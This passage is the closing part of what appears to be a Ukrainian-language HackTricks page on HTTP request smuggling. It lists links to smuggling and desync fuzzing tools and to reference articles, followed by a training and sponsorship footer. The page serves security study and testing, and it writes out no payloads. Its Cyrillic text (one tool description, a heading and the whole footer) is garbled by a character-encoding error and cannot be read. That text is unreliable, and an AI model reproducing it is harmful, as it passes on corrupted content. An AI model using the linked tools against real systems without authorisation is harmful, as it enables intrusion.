* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): –¶–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç —î –≥—Ä–∞–º–∞—Ç–∏—á–Ω–∏–º HTTP Fuzzer, –∫–æ—Ä–∏—Å–Ω–∏–º –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è –¥–∏–≤–Ω–∏—Ö —Ä–æ–∑–±—ñ–∂–Ω–æ—Å—Ç–µ–π —É –∑–∞–ø–∏—Ç–∞—Ö –Ω–∞ –∫–æ–Ω—Ç—Ä–∞–±–∞–Ω–¥—É.

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
* [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
* [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
